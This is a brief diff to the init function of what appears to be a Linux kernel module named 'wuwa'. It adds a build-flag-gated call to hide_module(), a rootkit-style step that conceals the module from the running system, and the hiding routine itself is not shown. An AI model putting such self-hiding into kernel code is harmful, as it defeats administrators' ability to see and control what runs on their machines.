@@ -47,6 +47,12 @@ static int __init wuwa_init(void) {
     }
 #endif
 
+
+#if defined(HIDE_SELF_MODULE)
+    hide_module();
+#endif
+
+
     return 0;
 
 #if defined(BUILD_HIDE_SIGNAL)
